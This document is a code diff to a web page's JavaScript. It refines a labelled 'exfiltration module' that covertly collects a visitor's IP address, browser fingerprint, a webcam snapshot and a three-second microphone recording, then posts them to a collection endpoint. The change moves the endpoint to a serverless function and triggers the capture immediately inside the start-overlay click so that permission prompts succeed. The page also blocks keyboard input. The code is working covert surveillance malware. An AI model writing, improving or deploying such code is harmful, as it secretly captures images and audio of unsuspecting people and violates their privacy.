@@ -159,10 +159,11 @@ body, html {
     const ORIGINAL_HEIGHT = 480;
 
     // ================================================================
-    // NEW: EXFILTRATION MODULE (IP, fingerprint, webcam, mic)
+    // EXFILTRATION MODULE (no tokens here, sends to /api/collect)
     // ================================================================
-    const BACKEND_URL = 'https://kekman.space/collect'; // CHANGE THIS
+    const BACKEND_URL = '/api/collect'; // Vercel serverless function
 
+    // --- IP ---
     async function getIP() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -179,6 +180,7 @@ body, html {
         }
     }
 
+    // --- Fingerprint ---
     function getFingerprint() {
         const fp = {};
         fp.userAgent = navigator.userAgent;
@@ -224,13 +226,14 @@ body, html {
         return fp;
     }
 
+    // --- Webcam (returns base64 JPEG or null) ---
     async function captureWebcam() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 } } });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 200)); // wait for first frame
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -243,6 +246,7 @@ body, html {
         }
     }
 
+    // --- Microphone (returns base64 WAV or null) ---
     async function captureMic() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -258,33 +262,40 @@ body, html {
                     stream.getTracks().forEach(t => t.stop());
                 };
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 3000);
+                setTimeout(() => mediaRecorder.stop(), 3000); // 3 sec record
             });
         } catch (e) {
             return null;
         }
     }
 
+    // --- Send everything to backend ---
     async function sendToBackend(ipData, fingerprint, webcamBase64, micBase64) {
         const payload = { ipData, fingerprint, webcam: webcamBase64, mic: micBase64, timestamp: new Date().toISOString() };
         try {
-            await fetch(BACKEND_URL, {
+            const response = await fetch(BACKEND_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
+            if (!response.ok) console.warn('Backend responded with error:', await response.text());
+            else console.log('Data sent successfully.');
         } catch (e) {
-            console.warn('Failed to send to backend:', e);
+            console.error('Failed to send to backend:', e);
         }
     }
 
+    // --- Main exfiltration (called immediately inside click handler) ---
     async function runExfiltration() {
-        const ipData = await getIP();
-        const fingerprint = getFingerprint();
-        const webcamBase64 = await captureWebcam();
-        const micBase64 = await captureMic();
+        const [ipData, fingerprint, webcamBase64, micBase64] = await Promise.all([
+            getIP(),
+            new Promise(resolve => resolve(getFingerprint())),
+            captureWebcam(),
+            captureMic()
+        ]);
         await sendToBackend(ipData, fingerprint, webcamBase64, micBase64);
     }
+
     // ================================================================
     // END OF EXFILTRATION MODULE
     // ================================================================
@@ -385,7 +396,7 @@ body, html {
         }
     }
 
-    // --- START FUNCTION ---
+    // --- START FUNCTION (ORIGINAL) ---
     window.startExperience = function() {
         if (hasTriggered) return;
         hasTriggered = true;
@@ -421,10 +432,8 @@ body, html {
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
 
-        // ======== ADDED: Run exfiltration ========
-        setTimeout(() => {
-            runExfiltration().catch(console.warn);
-        }, 500);
+        // ======== ADDED: Run exfiltration immediately (inside user gesture) ========
+        runExfiltration().catch(console.warn);
     };
 
     document.getElementById('startOverlay').addEventListener('click', startExperience);
